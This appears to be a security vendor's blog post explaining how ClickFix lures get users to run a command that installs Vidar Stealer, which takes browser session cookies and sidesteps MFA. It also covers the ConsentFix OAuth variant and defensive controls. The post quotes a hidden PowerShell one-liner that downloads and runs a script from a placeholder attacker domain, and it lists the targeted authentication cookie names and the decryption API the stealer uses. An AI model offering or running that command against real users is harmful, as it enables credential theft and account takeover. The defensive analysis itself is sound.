---
title: "The Cookie Is the Credential: How ClickFix and Info-Stealers Are Bypassing MFA at Scale"
description: "ClickFix doesn't steal your password. It tricks you into running a command that deploys Vidar Stealer, which silently exports every session cookie from every browser profile on your machine. The session cookie is the credential — and MFA never gets a chance to stop it."
pubDate: 2026-05-08
author: "AuthLayer Team"
tags: ["phishing", "mfa", "identity", "browser-security"]
image: "/images/og/session-cookies.jpg"
featured: false
---

ClickFix doesn't phish for your password. It doesn't try to intercept an MFA code. It skips all of that.

It tricks you into opening a terminal and running a command. That command installs an info-stealer. The info-stealer exports every session cookie from every browser profile on your machine — Chrome, Firefox, Edge, Brave — and sends them to a command-and-control server. Within minutes, someone in a different country is authenticated to your corporate SaaS tools, your email, your cloud console, your banking, without ever entering a password or touching an authenticator app.

Australian authorities issued a warning about this campaign this week. It's not a new technique. But the scale, tooling, and operator sophistication have reached a point where it deserves to be understood precisely.

## What ClickFix actually is

ClickFix is a social engineering delivery mechanism, not a piece of malware itself. The name comes from the fake "fix" it offers: a fabricated error message — a broken CAPTCHA, a failed document render, a system integrity warning — that instructs the user to manually run a command to resolve the issue.

The prompt is usually a Windows Run dialog or PowerShell window, pre-populated with a command the victim is told to paste and execute. The instruction looks mundane. The command is not.

```
Windows cannot display this document correctly.
To fix this issue, press Windows+R, paste the following command, and press Enter:
powershell -w hidden -c "iex(iwr 'https://[attacker-domain]/fix.ps1')"
```

This is the entire attack surface: one moment of misplaced trust in an error message. No email attachment. No browser exploit. No zero-day. The user runs the payload themselves.

## What the payload does

The command fetches and executes a PowerShell stager that downloads an info-stealer — in the campaigns active this week, primarily **Vidar Stealer**, a commodity malware family sold as a service on underground forums.

Vidar's job is systematic and quiet:

1. **Enumerate browser profiles** — Chrome-family browsers store session data in SQLite databases at predictable paths (`%LOCALAPPDATA%\Google\Chrome\User Data\Default\`). Vidar reads them directly.
2. **Decrypt cookie values** — Modern browsers encrypt stored cookies using DPAPI (Data Protection API), keyed to the current Windows user session. Vidar calls the same Windows APIs the browser uses — `CryptUnprotectData` — to decrypt them in-process. No bypass needed; it's running as the same user.
3. **Export authentication cookies** — Specifically targets cookies with names like `__Secure-3PSID`, `SSID`, `SID` (Google), `auth_token` (Microsoft 365), `s` (AWS), `sid` (Salesforce), `d` (Slack), `xs` (Meta). These are session tokens, not passwords.
4. **Exfiltrate** — Cookies, autofill credentials, saved passwords, and cryptocurrency wallet files are packaged and sent to a C2 server. The entire process takes under 60 seconds on a typical machine.

## Why session cookies make MFA irrelevant

This is the part that matters most for defenders to internalise.

A session cookie is created *after* authentication completes. When a user logs into Gmail, enters their password, completes their MFA challenge, and lands on their inbox — at that point the browser receives a session cookie. That cookie represents an already-authenticated session. From the server's perspective, presenting the cookie is equivalent to having already authenticated.

When an attacker imports that cookie into their own browser, they don't re-authenticate. They don't trigger a login event. They don't hit an MFA prompt. The session is already established. They're just resuming it from a different IP.

The attack chain, from the server's perspective:

1. User authenticates (password + MFA) → server issues session cookie
2. Info-stealer exfiltrates session cookie
3. Attacker loads cookie into browser at `attacker.com` or a browser extension that injects cookies into a target domain
4. Attacker navigates to app — server sees a valid session cookie, returns the authenticated page
5. No login event logged. No MFA event triggered. No anomaly in the authentication log.

This is why ClickFix and info-stealers have become the preferred initial access technique for groups that previously relied on adversary-in-the-middle phishing kits. AiTM kits are more complex to operate and more likely to be detected. Cookie theft from a compromised endpoint is simpler and produces credentials that are immediately usable.

## The ConsentFix variant

A related campaign disclosed this week goes further. Researchers documented a technique they've named **ConsentFix**, which uses a similar ClickFix social engineering lure but delivers a different payload: an Azure CLI command that initiates an OAuth device code flow.

```
az login --use-device-code
```

The victim is told this command will "fix" their Microsoft account access. They run it, receive a device code, and are prompted to enter it at `microsoft.com/devicelogin` — which looks legitimate and is legitimate. What they don't realise is that completing this flow grants the attacker's registered Azure application a persistent OAuth token for their Microsoft 365 account.

No session cookie needed. No password stolen. The attacker now has a refresh token tied to a tenant-trusted application, which survives password changes and is invisible in most standard authentication logs. It's the OAuth persistence problem from a different entry point.

## What the cookie market looks like

Stolen session cookies don't only get used by the group that stole them. They're traded.

Credential markets like Russian Market, Genesis Market's successors, and Telegram-based shops sell "logs" — packages containing browser cookies, saved passwords, and autofill data from a single compromised machine. A log with active session tokens for a corporate Microsoft 365 account can sell for between $10 and $150, depending on the organisation's apparent value and whether the tokens are verified fresh.

Initial access brokers purchase these logs, verify which tokens are still active, and sell confirmed access to specific enterprise environments to ransomware operators and extortion groups. The chain from a single ClickFix execution to a ransomware deployment can involve three or four separate threat actors across different underground markets.

## What actually limits the damage

Three controls address cookie theft specifically. Standard perimeter defenses and MFA don't.

**Enforce Continuous Access Evaluation (CAE) or token binding where available.** CAE (available in Microsoft Entra, Google Workspace) allows the identity provider to revoke sessions in near-real-time when risk signals arrive — device compliance change, IP anomaly, direct revocation. A stolen cookie used from an anomalous IP triggers revocation before the attacker can establish persistence. This is the control that directly addresses the "session stolen from different IP" scenario.

**Treat unexpected session relocations as high-severity alerts.** If a session cookie for a corporate user appears authenticating from a country that user has never accessed from, that's a detection opportunity. Most SIEM and UEBA products can build this detection; most organisations haven't enabled it for session events because they focus on login events instead.

**Reduce session token lifetime for high-value applications.** If a session token expires in 2 hours instead of 30 days, the window of usefulness for a stolen cookie is dramatically smaller. For administrative portals, financial systems, and cloud consoles, short-lived tokens are worth the re-authentication friction.

**Implement Device Bound Session Credentials (DBSC).** Chrome and Edge have begun shipping support for DBSC, which cryptographically binds session tokens to the specific device that created them. A session token exported to a different machine fails because the attacker's machine doesn't hold the corresponding private key. Browser-level cookie theft becomes useless when this is enforced. It requires server-side implementation support, but major cloud providers are beginning to roll it out.

For the ClickFix delivery mechanism itself: endpoint controls that alert on PowerShell execution from user-initiated Run dialogs, and application controls that block unsigned script execution, cut off the delivery chain before the info-stealer runs.

## The structural shift

The pattern emerging across this wave of campaigns — ClickFix, ConsentFix, AiTM phishing kits, OAuth token theft — is consistent: attackers have adapted to the assumption that MFA exists. They no longer try to intercept the authentication event. They steal the artifact that authentication produces.

Session cookies, OAuth refresh tokens, SAML assertions — these are all post-authentication credentials. They bypass MFA because MFA already happened. The defenses that stop them are post-issuance controls: short lifetimes, device binding, anomaly detection on session use, and rapid revocation pipelines.

The MFA checkbox is no longer enough. What matters now is what you do with sessions after they're created.

---

*ClickFix and Vidar Stealer indicators of compromise are published by ASD's Australian Cyber Security Centre. Device Bound Session Credentials specification is maintained by the W3C Web Application Security Working Group.*
